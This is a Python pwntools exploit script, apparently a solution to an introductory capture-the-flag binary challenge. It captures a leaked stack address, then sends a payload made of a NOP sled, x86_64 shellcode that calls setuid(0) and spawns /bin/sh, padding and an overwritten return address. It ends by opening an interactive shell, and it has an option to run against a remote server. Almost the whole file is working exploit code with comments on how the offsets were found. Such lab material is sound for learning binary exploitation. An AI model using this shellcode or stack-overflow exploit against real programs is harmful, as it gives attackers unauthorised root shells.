#!/usr/bin/env python3
# Username = bulmax9797

import time, os, traceback, sys, os
import pwn
from pwn import *
import binascii, array
from textwrap import wrap
import re

binPath="/challenge/intro_challenge"
elf = pwn.context.binary = pwn.ELF(binPath,checksec=False)


def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)

# build in GDB support
# Set the breakpoint before jsut before the input is taken for debugging in gdb.

gdbscript = '''
break *vuln+80
continue
'''.format(**locals())

io = start()

# Following receives the address being leaked when the program is run. (Testing = 0x....).
# Converted to integer so that it can be packed using p64. Specified 16 since its a hexadecimal number.
# I added 4 to the address because during testing, I observed that the address pointing to the payload was consistently 4 bytes lower than expected.

io.recvuntil(b'= ')
ret2_shellcode=int(io.recv(14),16)+4
print(ret2_shellcode)

#define Payload & Gadgets

#https://shell-storm.org/shellcode/files/shellcode-77.html 49bytes payload for x86_64 with setuid(0) and /bin/sh
shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

# Got the buffer length as 88 using the cyclic pattern generator inside gdb.
# Subtracted 10 from the 88 in order to put the nops in the beginning of teh payload.
buf_len= 78

# Adding 10 bytes of nops before the shellcode.
nops=b"\x90" *10

# Constructed the payload with nops in beginning followed by the shellcode, then nops again and finally the return address pointing back to the payload.
payload = nops + shellcode + b"\x90" * (buf_len-len(shellcode)) + p64(ret2_shellcode)

# Printing the length of the payload
pwn.info("buffer len: %d",len(payload))

# Sending the payload ( It runs as the input for the program)
io.sendline(payload)
# Username = bulmax9797

io.interactive()

 

